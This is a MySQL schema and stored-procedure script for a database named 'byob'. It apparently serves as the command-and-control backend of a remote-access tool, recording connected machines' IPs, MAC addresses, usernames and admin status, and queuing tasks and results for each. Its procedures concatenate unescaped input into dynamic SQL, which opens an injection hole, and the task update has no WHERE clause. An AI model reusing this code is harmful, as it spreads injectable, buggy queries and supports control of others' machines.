DELIMITER $$
CREATE DATABASE IF NOT exists `byob`;
use `byob`;
CREATE TABLE IF NOT exists `tbl_sessions` (
    `id` serial,
    `uid` varchar(32) NOT NULL,
    `online` boolean DEFAULT 0,
    `joined` DATETIME DEFAULT NULL,
    `last_online` DATETIME DEFAULT NULL,
    `sessions` tinyint(3) DEFAULT 1,
    `public_ip` varchar(42) DEFAULT NULL,
    `mac_address` varchar(17) DEFAULT NULL,
    `local_ip` varchar(42) DEFAULT NULL,
    `username` text DEFAULT NULL,
    `administrator` boolean DEFAULT 0,
    `platform` text DEFAULT NULL,
    `device` text DEFAULT NULL,
    `architecture` text DEFAULT NULL,
    PRIMARY KEY (`uid`(32)))
    DEFAULT CHARSET=latin1;
DROP PROCEDURE IF exists `sp_handle_session`;
CREATE DEFINER=`root`@`localhost` PROCEDURE sp_handle_session(IN `input` text, OUT `session` JSON)
BEGIN
    DECLARE `@sql` text;
    DECLARE `uid` varchar(32);
    SET session=JSON_UNQUOTE(input);
    SET session=JSON_MERGE(session, JSON_OBJECT('uid', MD5(CONCAT(session->>'$.public_ip', session->>'$.mac_address'))));
    INSERT INTO `tbl_sessions`
    (
         online,
         sessions,
         joined,
         last_online,
         uid,
         public_ip,
         local_ip,
         mac_address,
         username,
         administrator,
         device,
         platform,
         architecture
    )
    VALUES
    (
         1,
         1,
         NOW(),
         NOW(),
         session->>'$.uid',
         session->>'$.public_ip',
         session->>'$.local_ip',
         session->>'$.mac_address',
         session->>'$.username',
         session->>'$.administrator',
         session->>'$.device',
         session->>'$.platform',
         session->>'$.architecture'
    )
    ON DUPLICATE KEY UPDATE online=1, last_online=NOW(), sessions=sessions+1;
    SET @sql=CONCAT("CREATE TABLE IF NOT EXISTS `", session->>'$.uid',"` (`id` serial,`uid` varchar(32), `task` text DEFAULT NULL, `result` text DEFAULT NULL, `issued` DATETIME DEFAULT NULL, `completed` DATETIME DEFAULT NULL, PRIMARY KEY (`uid`(32))) DEFAULT CHARSET=latin1;");
    PREPARE `stmt` FROM @sql;
    EXECUTE `stmt`;
END;
DROP PROCEDURE IF EXISTS `sp_handle_task`;
CREATE DEFINER=`root`@`localhost` PROCEDURE sp_handle_task(IN `input` text, OUT `task` JSON)
BEGIN
    DECLARE `@sql` text;
    SET input=JSON_UNQUOTE(input);
    IF (input->>'$.uid') IS NULL THEN SET task=JSON_SET(input, '$.issued', NOW(), '$.uid', MD5(CONCAT(input->>'$.session', input->>'$.task', NOW())));
    ELSE SET task=JSON_SET(input, '$.completed', NOW());
    END IF;
    IF (input->>'$.result') IS NULL THEN SET @sql=CONCAT("INSERT INTO ", task->>'$.session'," (uid, task, issued) VALUES ('", task->>'$.uid', "','", task->>'$.task', "','", task->>'$.issued', "');");
    ELSE SET @sql=CONCAT("UPDATE ", task->>'$.session', " SET result='", task->>'$.result', "', completed='", NOW(), "';");
    END IF;
    PREPARE `stmt` FROM @sql;
    EXECUTE `stmt`;
END;
